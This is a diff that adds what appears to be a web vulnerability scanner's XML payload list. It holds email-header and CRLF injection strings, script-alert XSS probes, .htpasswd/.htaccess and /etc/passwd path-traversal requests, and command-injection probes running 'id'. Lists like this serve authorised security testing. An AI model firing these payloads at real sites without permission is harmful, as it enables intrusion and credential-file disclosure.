@@ -1,0 +1,29 @@
+<insert_var>
+	<item name="Email Injection"><![CDATA[%250A:%20peter.pan@gmail.com]]></item>
+	<item name="Email Injection"><![CDATA[%0ACC:%20peter.pan@gmail.com]]></item>
+	<item name="CRLF Injection - add Location header hudefrude"><![CDATA[any%0D%0ALocation:%20hudefrude]]></item>
+	<item name="Cross site scripting"><![CDATA[<script>alert('hudefrude')</script>]]></item>
+	<item name="Cross site scripting"><![CDATA[%22<script>alert('hudefrude')</script>]]></item>
+	<item name="Cross site scripting"><![CDATA[%27<script>alert('hudefrude')</script>]]></item>
+	<item name="Encoded Cross site scripting"><![CDATA[%22%3Cscript%3Ealert('test')%3C/script%3E]]></item>
+	<item name="Encoded Cross site scripting"><![CDATA[%27%3Cscript%3Ealert('test')%3C/script%3E]]></item>
+	<item name="Cross site scripting"><![CDATA["<script>alert('hudefrude')</script>]]></item>
+	<item name="Cross site scripting"><![CDATA[[\xC0][\xBC]script>[alert('hudefrude');][\xC0][\xBC]/script>>]]></item>
+	<item name="Encoded Cross site scripting"><![CDATA["%3Cscript%3Ealert('test')%3C/script%3E]]></item>
+	<item name="Cross site scripting"><![CDATA['<script>alert('hudefrude')</script>]]></item>
+	<item name="Cross site scripting"><![CDATA[&{[alert  ('hudefrude');]};]]></item>
+	<item name="Encoded Cross site scripting"><![CDATA['%3Cscript%3Ealert('test')%3C/script%3E]]></item>
+	<item name="Get htpasswd file 1"><![CDATA[htpasswd]]></item>
+	<item name="Get htpasswd file 2"><![CDATA[.htpasswd]]></item>
+	<item name="Get htaccess file 3"><![CDATA[htaccess]]></item>
+	<item name="Get htaccess file 4"><![CDATA[.htaccess]]></item>
+	<item name="Get Passwd file"><![CDATA[../../../../../../../../../../../../../etc/passwd]]></item>
+	<item name="Get htpasswd file 1"><![CDATA[htpasswd%00]]></item>
+	<item name="Get htpasswd file 2"><![CDATA[.htpasswd%00]]></item>
+	<item name="Get htaccess file 3"><![CDATA[htaccess%00]]></item>
+	<item name="Get htaccess file 4"><![CDATA[.htaccess%00]]></item>
+	<item name="Get Remote id 1"><![CDATA[id]]></item>
+	<item name="Get Remote id 1"><![CDATA[/bin/id]]></item>
+	<item name="Get Remote id 1"><![CDATA[/usr/bin/id]]></item>
+	<item name="Keyword injected 1"><![CDATA[hudefrudehude]]></item>
+</insert_var>
